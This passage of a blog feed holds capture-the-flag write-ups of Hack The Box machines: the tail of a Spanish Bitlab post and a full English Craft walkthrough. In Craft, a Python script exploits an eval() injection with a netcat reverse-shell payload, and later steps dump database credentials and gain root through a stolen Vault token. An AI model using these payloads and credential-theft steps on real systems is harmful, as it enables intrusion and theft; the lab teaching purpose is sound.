<span style="color:#a6e22e">print_r</span>(<span style="color:#a6e22e">$arr</span>);
</code></pre></div><p>Y despué de guardarlos y hacerle merge, nos vamos a <code>http://10.10.10.114/profile/&lt;el nombre que le diste al script&gt;</code>, y deberíamos tener como resultado el array en pantalla con el usuario <code>clave</code> y una contraseñá:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Array ( [<span style="color:#ae81ff">0</span>] =&gt; Array ( [<span style="color:#a6e22e">id</span>] =&gt; <span style="color:#ae81ff">1</span> [<span style="color:#a6e22e">username</span>] =&gt; <span style="color:#a6e22e">clave</span> [<span style="color:#a6e22e">password</span>] =&gt; <span style="color:#a6e22e">c3NoLXN0cjBuZy1wQHNz</span><span style="color:#f92672">==</span> ) )
</code></pre></div><p>Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
</code></pre><p>Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama <code>RemoteConnection.exe</code>, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.</p>
<p>Bueno, entonces sabemos que esta máquina tiene dos formas de conseguir root. Me encantó esta máquina, y estoy esperando a tirarme al agua con ella de nuevo cuando tenga un poquito más de idea de ing. inversa.</p>
<p>Ta luego, hasta el próximo paso a paso!</p>
]]></content></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/es/posts/2020/01/hack-the-box-craft/</guid><description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description><content type="html"><![CDATA[
    <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="quick-summary">Quick Summary</h2>
<p>So!!
Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot <a href="https://www.hackthebox.eu/profile/103596">@Fugl!</a>), root was easy by a little bit of enumeration and reading help command output.</p>
<p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!</p>
<p>Said that, let&rsquo;s start with the real write up!</p>
<h2 id="nmap">Nmap</h2>
<p>We start running nmap to scan for open ports and services:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
Nmap scan report for 10.10.10.110
Host is up (0.082s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
</code></pre><p>We got port port 22 (SSH) and 443 (HTTPS) are open.</p>
<h2 id="web-enumeration">Web enumeration</h2>
<p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to <code>https://api.craft.htb</code> and <code>https://gogs.craft.htb</code>, we will add them to <code>/etc/hosts</code> pointing to the IP of craft <code>10.10.10.110</code>.</p>
<p>
    <img src="/images/htb/craft/1-web-enum.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-web-enum.png"  class="center"  style="border-radius: 8px;"  />

</p>
<p>Afterwards, we jump into <code>https://api.craft.htb</code> and we can see the endpoints and how to interact with them.</p>

    <img src="/images/htb/craft/1-api.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-api.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/3-api.png"  class="center"  style="border-radius: 8px;"  />


<p>We don&rsquo;t have at the moment any credentials to identify, so we go to <code>https://gogs.craft.htb</code> in order to see if we can find something.</p>

    <img src="/images/htb/craft/1-gogs.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-gogs.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/3-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>We see in explore there is a repository named <code>craft-api</code> and that the users is our gang from Silicon Valley.</p>
<p>We jump into the repository, and start looking if we can find something.</p>

    <img src="/images/htb/craft/4-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>There is an issue open, so we go inside it, and there is a &ldquo;fix&rdquo;, one that Gilfoyle is not happy about it.</p>

    <img src="/images/htb/craft/5-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>So, there is the use of an <code>eval()</code>, that&rsquo;s something we could use to inject a command.</p>

    <img src="/images/htb/craft/6-gogs.png"  class="center"  style="border-radius: 8px;"  />


<p>Taking a look into the commits made by Denish, we found in the commit <code>a2d28ed155</code> that he removed hardcoded credentials, exactly the kind of things we needed:</p>

    <img src="/images/htb/craft/7-gogs.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="rce">RCE</h2>
<p>Now with credentials, knowing we could take advantage of the <code>eval()</code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to <code>/api/brew/</code>.
I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use <code>test.py</code> realized about it late). grabbing the token and using it to authenticate.</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py 
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import re
import json

url = &quot;https://api.craft.htb/api/auth/login&quot;
login=('dinesh', '4aUh0A8PbVJxgd')
r = requests.get(url, auth=login, allow_redirects=False, verify=False)
token = json.loads(r.text)['token']
print(token)
url = &quot;https://api.craft.htb/api/brew/&quot;
headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
inject = &quot;&quot;&quot;__import__(&quot;os&quot;).system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&quot;)&quot;&quot;&quot;
payload = {&quot;name&quot;:&quot;foo&quot;,&quot;brewer&quot;:&quot;foo&quot;, &quot;style&quot;:&quot;foo&quot;, &quot;abv&quot;:inject}
payload = json.dumps(payload)
attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
</code></pre><p>In one tab run nc listening on port 4444 with <code>nc -lvp 4444</code>, and run in other tab we run the script to get the reverse:</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py 
</code></pre><pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</code></pre><p>There is something weird, we are already root? we check if there is the <code>root.txt</code> in it&rsquo;s home and not, is not:</p>
<pre><code class="language-console" data-lang="console">/opt/app # cd /root
/root # ls -la
total 12
drwx------    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
drwx------    1 root     root          4096 Feb  9  2019 .cache
/root # 
</code></pre><p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):</p>
<pre><code class="language-console" data-lang="console">/opt/app # ls -la /
total 64
drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin
drwxr-xr-x    5 root     root           340 Jan  4 20:47 dev
drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
dr-xr-xr-x  208 root     root             0 Jan  4 20:47 proc
drwx------    1 root     root          4096 Feb  9  2019 root
drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
dr-xr-xr-x   13 root     root             0 Jan  4 20:47 sys
drwxrwxrwt    1 root     root          4096 Jan  4 20:48 tmp
drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
/opt/app # ls -la /usr/bin
total 13236
drwxr-xr-x    1 root     root          4096 Feb  9  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
lrwxrwxrwx    1 root     root             8 Feb  9  2019 2to3 -&gt; 2to3-3.6
-rwxr-xr-x    1 root     root            95 Jan 24  2019 2to3-3.6
lrwxrwxrwx    1 root     root            12 Feb  6  2019 [ -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 [[ -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         34944 Jan  2  2019 addr2line
-rwxr-xr-x    2 root     root         55240 Jan  2  2019 ar
-rwxr-xr-x    2 root     root        814672 Jan  2  2019 as
lrwxrwxrwx    1 root     root            12 Jan 30  2019 awk -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 basename -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 beep -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 blkdiscard -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bunzip2 -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzcat -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 bzip2 -&gt; /bin/busybox
-rwxr-xr-x    1 root     root         30440 Jan  2  2019 c++filt
-rwxr-xr-x    1 root     root           214 Jan  3  2019 c89
-rwxr-xr-x    1 root     root           205 Jan  3  2019 c99
-rwxr-xr-x    1 root     root         14208 Jan 29  2019 c_rehash
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cal -&gt; /bin/busybox
lrwxrwxrwx    1 root     root             3 Feb  9  2019 cc -&gt; gcc
lrwxrwxrwx    1 root     root            12 Jan 30  2019 chvt -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 cksum -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 clear -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cmp -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Feb  6  2019 comm -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cpio -&gt; /bin/busybox
-rwxr-xr-x    1 root     root        898192 Jan  3  2019 cpp
lrwxrwxrwx    1 root     root            12 Jan 30  2019 crontab -&gt; /bin/busybox
lrwxrwxrwx    1 root     root            12 Jan 30  2019 cryptpw -&gt; /bin/busybox
</code></pre><p>Inside the directory were we started <code>/opt/app</code> we see if there is something interesting:</p>
<pre><code class="language-console" data-lang="console">/opt/app # ls -la
total 32
drwxr-xr-x    5 root     root          4096 Feb 10  2019 .
drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
/opt/app # grep -ir '\(pass\|password\|passwd\)' *       
app.py:    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc:        Create an authentication token provided valid username and password.
craft_api/api/auth/endpoints/auth.py:        auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
craft_api/api/auth/endpoints/auth.py:        Create an authentication token provided valid username and password.
craft_api/database/models.py:    password = db.Column(db.String(80))
craft_api/database/models.py:    def __init__(self, username, password):
craft_api/database/models.py:        self.password = password
craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
dbtest.py:                             password=settings.MYSQL_DATABASE_PASSWORD,
/opt/app # 
</code></pre><p>There we see we have credentials for the database, we took a deep look into <code>craft_api/settings.py</code> to see which one is the user, and it&rsquo;s <code>craft</code>, we take a look into the <code>dbtest.py</code> we found early under <code>/opt/app</code>:</p>
<pre><code class="language-console" data-lang="console">/opt/app # cat dbtest.py
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = &quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
/opt/app #
</code></pre><p>It&rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the <code>method fetchall()</code>

    <img src="/images/htb/craft/1-rce.png"  class="center"  style="border-radius: 8px;"  />


So, I change the script to do a <code>show tables</code> using <code>fetchall()</code> instead of <code>fetchone()</code>:</p>
<pre><code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&quot;show tables\&quot;/' dbtest.py
/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
</code></pre><p>And post that, we ran the script, and we get 2 tables one that looks interesting named <code>user</code>, we modify again the sql query but to select all the records from that table:</p>
<pre><code class="language-console" data-lang="console">/opt/app # python dbtest.py
[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
/opt/app # sed -i 's/sql \= \&quot;show tables\&quot;/sql \= \&quot;SELECT * FROM user\&quot;/' dbtest.py
/opt/app # python dbtest.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
/opt/app # 
</code></pre><p>So, we got the users <code>dinesh, ebachman and gilfoyle</code> and it&rsquo;s respective passwords, with that we go to <code>https://gogs.craft.htb</code> again and login as <code>gilfoyle</code> and we found that he has a private repo to deploy the infra called <code>craft-infra</code></p>

    <img src="/images/htb/craft/1-gil.png"  class="center"  style="border-radius: 8px;"  />



    <img src="/images/htb/craft/2-gil.png"  class="center"  style="border-radius: 8px;"  />


<p>We notice there exists a <code>.ssh</code> folder, we look into it and we get a pair of public/private ssh keys:</p>

    <img src="/images/htb/craft/3-gil.png"  class="center"  style="border-radius: 8px;"  />


<p>We try to login via ssh as <code>gilfoyle</code> re-using the password we got earlier and we found a success (actually the first tries it failed for me, and spent some hours trying to break the id_rsa with john without success, so give a new try with trying the founded passwords):</p>
<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ssh gilfoyle@10.10.10.110 -i id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan  3 23:45:10 2020 from 10.10.14.16
gilfoyle@craft:~$ id
uid=1001(gilfoyle) gid=1001(gilfoyle) groups=1001(gilfoyle)
gilfoyle@craft:~$ wc -c user.txt 
33 user.txt
</code></pre><h2 id="root">root</h2>
<p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href="https://www.vaultproject.io/">Vault project page</a>), and try to login to vault with it which goes well.</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
Token (will be hidden): 
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run &quot;vault login&quot;
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       [&quot;root&quot;]
identity_policies    []
policies             [&quot;root&quot;]
gilfoyle@craft:~$ 
</code></pre><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:

    <img src="/images/htb/craft/4-gil.png"  class="center"  style="border-radius: 8px;"  />


with this information we run vault to get the kv if the secret is indeed there:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
========== Data ==========
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
</code></pre><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href="https://en.wikipedia.org/wiki/One-time_password">One-Time Password</a>)
We check what options vault provides to use it:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$ vault
Usage: vault &lt;command&gt; [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit          Interact with audit devices
    auth           Interact with auth methods
    kv             Interact with Vault's Key-Value storage
    lease          Interact with leases
    namespace      Interact with namespaces
    operator       Perform operator-specific tasks
    path-help      Retrieve API help for paths
    plugin         Interact with Vault plugins and catalog
    policy         Interact with policies
    secrets        Interact with secrets engines
    ssh            Initiate an SSH session
    token          Interact with tokens
gilfoyle@craft:~$ vault ssh -h
Usage: vault ssh [options] username@ip [ssh options]

  Establishes an SSH connection with the target machine.

  This command uses one of the SSH secrets engines to authenticate and
  automatically establish an SSH connection to a host. This operation requires
  that the SSH secrets engine is mounted and configured.

  SSH using the OTP mode (requires sshpass for full automation):

      $ vault ssh -mode=otp -role=my-role user@1.2.3.4

  SSH using the CA mode:

      $ vault ssh -mode=ca -role=my-role user@1.2.3.4

  SSH using CA mode with host key verification:

      $ vault ssh \
          -mode=ca \
          -role=my-role \
          -host-key-mount-point=host-signer \
          -host-key-hostnames=example.com \
          user@example.com

  For the full list of options and arguments, please see the documentation.
</code></pre><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p>
<pre><code class="language-console" data-lang="console">gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256


.   *   ..  . *  *
*  * @()Ooc()*   o  .
  (Q@*0CG*O()  ___
 |\_________/|/ _ \
 |  |  |  |  | / | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | | | |
 |  |  |  |  | \_| |
 |  |  |  |  |\___/
 |\_|__|__|_/|
  \_________/



Password: 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
root@craft:~# wc -c root.txt
33 root.txt
root@craft:~# 
</code></pre><p>And we own root!!
Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
<p>Thanks a lot for reading, and until the next write-up.</p>
]]></content></item></channel></rss>